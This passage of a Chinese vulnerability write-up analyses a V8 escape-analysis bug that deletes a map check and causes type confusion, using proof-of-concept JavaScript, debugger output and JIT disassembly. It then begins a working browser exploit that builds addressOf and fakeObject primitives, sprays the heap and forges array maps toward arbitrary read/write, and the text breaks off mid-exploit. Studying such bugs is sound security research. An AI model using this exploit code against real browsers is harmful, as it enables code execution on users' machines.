<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   //触发JIT编译</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = [1.1]; //未逃逸</span><br><span class="line">   foo(a); //逃逸</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">x = Array(0);</span><br><span class="line">print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型</span><br></pre></td></tr></table></figure>
<p>这样运行，会发现opt的JIT生成了两次，也就是说<code>print(opt((o)=&gt;&#123;o[0] = x;&#125;)); </code>这句的opt调用并没有匹配到之前opt生成的JIT代码，查看第一次生成的JIT代码（关键部分）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x131a00084fa9    e9  49ba009784e7ad7f0000 REX.W movq r10,0x7fade7849700  (CreateShallowArrayLiteral)    ;; off heap target</span><br><span class="line">0x131a00084fb3    f3  41ffd2         call r10</span><br><span class="line">0x131a00084fb6    f6  49c7c504000000 REX.W movq r13,0x4</span><br><span class="line">0x131a00084fbd    fd  e87ef00b00     call 0x131a00144040     ;; deopt-soft deoptimization bailout</span><br></pre></td></tr></table></figure>
<p>查看第二次JIT生成的关键代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   f8  488945b8       REX.W movq [rbp-0x48],rax</span><br><span class="line">0x131a000851dc    fc  4c8b4518       REX.W movq r8,[rbp+0x18]</span><br><span class="line">0x131a000851e0   100  48bf6d8c14081a130000 REX.W movq rdi,0x131a08148c6d    ;; object: 0x131a08148c6d &lt;JSFunction (sfi = 0x131a082d269d)&gt;</span><br><span class="line">0x131a000851ea   10a  443bc7         cmpl r8,rdi</span><br><span class="line">0x131a000851ed   10d  0f85db010000   jnz 0x131a000853ce  &lt;+0x2ee&gt;</span><br></pre></td></tr></table></figure>
<p>可以看出，第一次并没有匹配参数，而是直接<code> deopt-soft deoptimization bailout</code>，而第二次有匹配参数，判断函数地址是否为指定值，因此，我们再增加几个opt调用看看有什么变化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   //触发JIT编译</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = [1.1]; //未逃逸</span><br><span class="line">   foo(a); //逃逸</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">x = Array(0);</span><br><span class="line">print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型</span><br></pre></td></tr></table></figure>
<p><img src="https://p1.ssl.qhimg.com/t013596a581fda8e77a.png"><br>我们看到，最后一个标号为2，也就是总共生成了opt函数的3份JIT代码，而我们的js里有4个opt函数调用，也就是说，最后的<code>print(opt((o)=&gt;&#123;o[0] = x;&#125;));</code>成功匹配了JIT代码。<br>我们查看最后一份的JIT代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0x2a000854c0     0  488d1df9ffffff REX.W leaq rbx,[rip+0xfffffff9]</span><br><span class="line">0x2a000854c7     7  483bd9         REX.W cmpq rbx,rcx</span><br><span class="line">0x2a000854ca     a  7418           jz 0x2a000854e4  &lt;+0x24&gt;</span><br><span class="line">0x2a000854cc     c  48ba6a00000000000000 REX.W movq rdx,0x6a</span><br><span class="line">0x2a000854d6    16  49ba20371523787f0000 REX.W movq r10,0x7f7823153720  (Abort)    ;; off heap target</span><br><span class="line">0x2a000854e0    20  41ffd2         call r10</span><br><span class="line">0x2a000854e3    23  cc             int3l</span><br><span class="line">0x2a000854e4    24  8b59d0         movl rbx,[rcx-0x30]</span><br><span class="line">0x2a000854e7    27  4903dd         REX.W addq rbx,r13</span><br><span class="line">0x2a000854ea    2a  f6430701       testb [rbx+0x7],0x1</span><br><span class="line">0x2a000854ee    2e  740d           jz 0x2a000854fd  &lt;+0x3d&gt;</span><br><span class="line">0x2a000854f0    30  49ba20600523787f0000 REX.W movq r10,0x7f7823056020  (CompileLazyDeoptimizedCode)    ;; off heap target</span><br><span class="line">0x2a000854fa    3a  41ffe2         jmp r10</span><br><span class="line">0x2a000854fd    3d  55             push rbp</span><br><span class="line">0x2a000854fe    3e  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x2a00085501    41  56             push rsi</span><br><span class="line">0x2a00085502    42  57             push rdi</span><br><span class="line">0x2a00085503    43  50             push rax</span><br><span class="line">0x2a00085504    44  4883ec10       REX.W subq rsp,0x10</span><br><span class="line">0x2a00085508    48  488975e0       REX.W movq [rbp-0x20],rsi</span><br><span class="line">0x2a0008550c    4c  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))</span><br><span class="line">0x2a00085510    50  0f86c5010000   jna 0x2a000856db  &lt;+0x21b&gt;</span><br><span class="line">0x2a00085516    56  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))</span><br><span class="line">0x2a0008551a    5a  0f86f4010000   jna 0x2a00085714  &lt;+0x254&gt;</span><br><span class="line">0x2a00085520    60  b901000000     movl rcx,0x1</span><br><span class="line">0x2a00085525    65  660f1f840000000000 nop</span><br><span class="line">0x2a0008552e    6e  6690           nop</span><br><span class="line">0x2a00085530    70  81f900000200   cmpl rcx,0x20000</span><br><span class="line">0x2a00085536    76  0f8332000000   jnc 0x2a0008556e  &lt;+0xae&gt;</span><br><span class="line">0x2a0008553c    7c  83c101         addl rcx,0x1</span><br><span class="line">0x2a0008553f    7f  49ba0000000001000000 REX.W movq r10,0x100000000</span><br><span class="line">0x2a00085549    89  4c3bd1         REX.W cmpq r10,rcx</span><br><span class="line">0x2a0008554c    8c  7715           ja 0x2a00085563  &lt;+0xa3&gt;</span><br><span class="line">0x2a0008554e    8e  48ba0200000000000000 REX.W movq rdx,0x2</span><br><span class="line">0x2a00085558    98  4c8b1579ffffff REX.W movq r10,[rip+0xffffff79]</span><br><span class="line">0x2a0008555f    9f  41ffd2         call r10</span><br><span class="line">0x2a00085562    a2  cc             int3l</span><br><span class="line">0x2a00085563    a3  493b6548       REX.W cmpq rsp,[r13+0x48] (external value (StackGuard::address_of_jslimit()))</span><br><span class="line">0x2a00085567    a7  77c7           ja 0x2a00085530  &lt;+0x70&gt;</span><br><span class="line">0x2a00085569    a9  e9cb010000     jmp 0x2a00085739  &lt;+0x279&gt;</span><br><span class="line">0x2a0008556e    ae  48b9f8c6112c25560000 REX.W movq rcx,0x56252c11c6f8    ;; external reference (Heap::NewSpaceAllocationTopAddress())</span><br><span class="line">0x2a00085578    b8  4c8b01         REX.W movq r8,[rcx]</span><br><span class="line">0x2a0008557b    bb  4d8d4820       REX.W leaq r9,[r8+0x20]</span><br><span class="line">0x2a0008557f    bf  49bb00c7112c25560000 REX.W movq r11,0x56252c11c700    ;; external reference (Heap::NewSpaceAllocationLimitAddress())</span><br><span class="line">.................................................................</span><br></pre></td></tr></table></figure>
<p>可以看到，最后一份JIT代码中，已经不再对参数进行匹配了，也就是说，即使我们记下来继续调用opt()，参数无论为什么，都会匹配到，我们测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   //触发JIT编译</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = [1.1]; //未逃逸</span><br><span class="line">   foo(a); //逃逸</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">opt((o)=&gt;&#123;&#125;);</span><br><span class="line">x = Array(0);</span><br><span class="line">//print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型</span><br><span class="line">opt(1);</span><br><span class="line">opt(&#123;&#125;);</span><br></pre></td></tr></table></figure>
<p>可以看到也只生成了3份JIT代码，最后两句的调用都直接走opt的JIT成功了。<br><img src="https://p0.ssl.qhimg.com/t01789815d9df6a03cc.png"><br>于是，我们的代码可以用for循环来精简一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   //触发JIT编译</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = [1.1]; //未逃逸</span><br><span class="line">   foo(a); //逃逸</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line">//生成多个JIT模板</span><br><span class="line">for (var i=0;i&lt;0x10;i++) &#123;</span><br><span class="line">   opt((o)=&gt;&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">x = Array(0);</span><br><span class="line">print(opt((o)=&gt;&#123;o[0] = x;&#125;)); //在外部函数里改变类型</span><br></pre></td></tr></table></figure>
<p>运行后，发现仍然不能发生类型混淆，继续调试<br>先是<code> (v8::internal::compiler::VirtualObject *) 0x5643165e5410</code>设置了<code>map_</code>值<br><img src="https://p4.ssl.qhimg.com/t01a5211fc0196ba77b.png"><br>然后<code>(v8::internal::compiler::VirtualObject *) 0x5643165e5770</code>设置了<code>map_</code>值<br><img src="https://p2.ssl.qhimg.com/t015eb61e72a337ec44.png"><br>接下来发现<code>(v8::internal::compiler::VirtualObject *) 0x5643165e5770</code>的<code>map_</code>值被清空<br><img src="https://p0.ssl.qhimg.com/t01f7547a83a3b77486.png"><br>接下来到这里，这个分支是当检测到对象逃逸时才会到达，由于前一步把这个<code>vobject</code>的<code>map_</code>给清空了，导致条件不成立，无法执行到<code>current-&gt;MarkForDeletion();</code><br><img src="https://p1.ssl.qhimg.com/t01c91887bae3f5e5f0.png"><br>上述POC失败的原因是因为在<code>case IrOpcode::kCheckMaps:</code>之前先进入了<code>default</code>把<code>map_</code>值给清空了，我们可以再对象里再裹一层对象试试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function opt(foo) &#123;</span><br><span class="line">   //触发JIT编译</span><br><span class="line">   for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   var a = [1.1]; //未逃逸</span><br><span class="line">   var b = [a]; //未逃逸</span><br><span class="line">   foo(b); //逃逸</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line">//生成多个JIT模板</span><br><span class="line">for (var i=0;i&lt;0x10;i++) &#123;</span><br><span class="line">   opt((o)=&gt;&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line">x = Array(0);</span><br><span class="line">print(opt((o)=&gt;&#123;o[0][0] = x;&#125;)); //在外部函数里改变类型</span><br></pre></td></tr></table></figure>
<p>接下来我们重新调试，我们发现<code>(const v8::internal::compiler::VirtualObject *) 0x558f95f216c0</code>这个节点的<code>checkmaps</code>被删除了，因此将造成类型混淆<br><img src="https://p1.ssl.qhimg.com/t01bd45c25aea783475.png"><br>继续运行，发现输出了对象的地址，发生了类型混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p vobject</span><br><span class="line">$16 = (const v8::internal::compiler::VirtualObject *) 0x558f95f216c0</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">4.765298071534956e-270</span><br><span class="line">[Thread 0x7f202c139700 (LWP 2742) exited]</span><br><span class="line">[Thread 0x7f202c93a700 (LWP 2741) exited]</span><br><span class="line">[Thread 0x7f202d13b700 (LWP 2740) exited]</span><br><span class="line">[Inferior 1 (process 2739) exited normally]</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>如下是有漏洞的JIT代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x2343000857c8   1a8  488b7d18       REX.W movq rdi,[rbp+0x18]</span><br><span class="line">0x2343000857cc   1ac  b801000000     movl rax,0x1</span><br><span class="line">0x2343000857d1   1b1  49bae0bfb6d9a77f0000 REX.W movq r10,0x7fa7d9b6bfe0  (Call_ReceiverIsNullOrUndefined)    ;; off heap target</span><br><span class="line">0x2343000857db   1bb  41ffd2         call r10 ;调用外部函数</span><br><span class="line">0x2343000857de   1be  488b4dd8       REX.W movq rcx,[rbp-0x28]</span><br><span class="line">0x2343000857e2   1c2  448b4107       movl r8,[rcx+0x7] ;以DOUBLE_ELEMENTS的方式取数据</span><br><span class="line">0x2343000857e6   1c6  4d03c5         REX.W addq r8,r13</span><br><span class="line">0x2343000857e9   1c9  448b490b       movl r9,[rcx+0xb]</span><br><span class="line">0x2343000857ed   1cd  41d1f9         sarl r9, 1</span><br><span class="line">0x2343000857f0   1d0  4183f900       cmpl r9,0x0</span><br><span class="line">0x2343000857f4   1d4  0f869a010000   jna 0x234300085994  &lt;+0x374&gt;</span><br><span class="line">0x2343000857fa   1da  c4c17b104007   vmovsd xmm0,[r8+0x7]</span><br><span class="line">0x234300085800   1e0  c5fb2cc8       vcvttsd2si rcx,xmm0</span><br><span class="line">0x234300085804   1e4  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx</span><br><span class="line">0x234300085808   1e8  c5f92ec8       vucomisd xmm1,xmm0</span><br><span class="line">0x23430008580c   1ec  0f8a39000000   jpe 0x23430008584b  &lt;+0x22b&gt;</span><br><span class="line">0x234300085812   1f2  0f8533000000   jnz 0x23430008584b  &lt;+0x22b&gt;</span><br><span class="line">0x234300085818   1f8  83f900         cmpl rcx,0x0</span><br><span class="line">0x23430008581b   1fb  0f8428010000   jz 0x234300085949  &lt;+0x329&gt;</span><br></pre></td></tr></table></figure>
<p>如下是无漏洞的JIT代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x286d000857b0   1b0  49ba405e010f7e7f0000 REX.W movq r10,0x7f7e0f015e40  (Call_ReceiverIsNullOrUndefined)    ;; off heap target</span><br><span class="line">0x286d000857ba   1ba  41ffd2         call r10</span><br><span class="line">0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]</span><br><span class="line">0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8</span><br><span class="line">0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  &lt;+0x36f&gt;</span><br><span class="line">0x286d000857d1   1d1  448b4107       movl r8,[rcx+0x7]</span><br><span class="line">0x286d000857d5   1d5  4d03c5         REX.W addq r8,r13</span><br><span class="line">0x286d000857d8   1d8  448b490b       movl r9,[rcx+0xb]</span><br><span class="line">0x286d000857dc   1dc  41d1f9         sarl r9, 1</span><br><span class="line">0x286d000857df   1df  4183f900       cmpl r9,0x0</span><br><span class="line">0x286d000857e3   1e3  0f8692010000   jna 0x286d0008597b  &lt;+0x37b&gt;</span><br><span class="line">0x286d000857e9   1e9  c4c17b104007   vmovsd xmm0,[r8+0x7]</span><br><span class="line">0x286d000857ef   1ef  c5fb2cc8       vcvttsd2si rcx,xmm0</span><br><span class="line">0x286d000857f3   1f3  c5832ac9       vcvtlsi2sd xmm1,xmm15,rcx</span><br><span class="line">0x286d000857f7   1f7  c5f92ec8       vucomisd xmm1,xmm0</span><br><span class="line">0x286d000857fb   1fb  0f8a25000000   jpe 0x286d00085826  &lt;+0x226&gt;</span><br><span class="line">0x286d00085801   201  0f851f000000   jnz 0x286d00085826  &lt;+0x226&gt;</span><br><span class="line">0x286d00085807   207  83f900         cmpl rcx,0x0</span><br><span class="line">0x286d0008580a   20a  0f8414010000   jz 0x286d00085924  &lt;+0x324&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现，由于逃逸分析时把<code>checkmaps</code>删除了，使得生成的JIT代码里调用完函数后少了如下的检查代码，由此发生类型混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x286d000857bd   1bd  488b4dd8       REX.W movq rcx,[rbp-0x28]</span><br><span class="line">0x286d000857c1   1c1  41b8fd383008   movl r8,0x83038fd       ;; (compressed) object: 0x286d083038fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt;</span><br><span class="line">0x286d000857c7   1c7  443941ff       cmpl [rcx-0x1],r8</span><br><span class="line">0x286d000857cb   1cb  0f859e010000   jnz 0x286d0008596f  &lt;+0x36f&gt;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>利用类型混淆，构造addressOf和fakeObj原语，然后利用两个原语伪造一个ArrayBuffer，实现任意地址读写。然后可以创建一个<code>div</code>对象，利用任意地址读写篡改其虚表，然后执行对应的操作劫持程序流</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u32f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f(value) &#123;</span><br><span class="line">   dv.setUint32(0,value,true);</span><br><span class="line">   return dv.getFloat32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">function opt0(o) &#123;</span><br><span class="line">   for(var i = 0; i &lt; 200000; i++) &#123; &#125;</span><br><span class="line">   let a = [1.1,2.2,3.3,4.4];</span><br><span class="line">   let b = [a];</span><br><span class="line">   o(b);</span><br><span class="line">   return a[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;10;i++) &#123;</span><br><span class="line">   opt0((o)=&gt;&#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var spary_size = 0x201;</span><br><span class="line">var spary = new Array(spary_size);</span><br><span class="line">for (var i=0;i&lt;spary_size;i+=3) &#123;</span><br><span class="line">   spary[i] = new Array(1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12,13.13,14.14,15.15);</span><br><span class="line">   spary[i+1] = new ArrayBuffer(0x2000);</span><br><span class="line">   spary[i+2] = new Float64Array(0x5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var addr = opt0((o)=&gt;&#123;o[0][0] = obj;&#125;);</span><br><span class="line">   return u32f(addr) - 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   var fval = i2f64(addr + 1);</span><br><span class="line">   let f = eval(`(x,y,val)=&gt;&#123;</span><br><span class="line">     for(var i = 0; i &lt; 200000; i++) &#123; &#125;</span><br><span class="line">     let a = [1.1,2.2,3.3,4.4];</span><br><span class="line">     let b = [a];</span><br><span class="line">     x(b);</span><br><span class="line">     a[0] = val;</span><br><span class="line">     return y(b);</span><br><span class="line">   &#125;`);</span><br><span class="line">   for (var i=0;i&lt;10;i++) &#123;</span><br><span class="line">      f((o)=&gt;&#123;&#125;,(o)=&gt;&#123;&#125;,fval);</span><br><span class="line">   &#125;</span><br><span class="line">   return f((o)=&gt;&#123;o[0][0] = &#123;&#125;;&#125;,(o)=&gt;&#123;return o[0][0];&#125;,fval);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let arr = spary[spary_size-0x3];</span><br><span class="line">let arr_address = addressOf(arr);</span><br><span class="line">let proto_addr = addressOf(Array.prototype);</span><br><span class="line"></span><br><span class="line">//fake a FixedDoubleArray Map</span><br><span class="line">arr[0] = p64f(0x08042115,0x18040404);</span><br><span class="line">arr[1] = p64f(0x29000423,0x0a0007ff);</span><br><span class="line">arr[2] = p64f(proto_addr+1,0);</span><br><span class="line">//alert(arr_address.toString(16));</span><br><span class="line"></span><br><span class="line">let element_addr = arr_address + 0x14;</span><br><span class="line">let fake_element = element_addr+0x44;</span><br><span class="line"></span><br><span class="line">//fake a FixedDoubleArray</span><br><span class="line">arr[4] = p64f(0,element_addr+0x8+0x1);</span><br><span class="line">arr[5] = p64f(0x08042229,fake_element+1);</span><br><span class="line">arr[6] = p64f(0x7ffffffe,0);</span><br><span class="line"></span><br><span class="line">//fake a FixedDoubleArray&#x27;s element</span><br><span class="line">arr[7] = 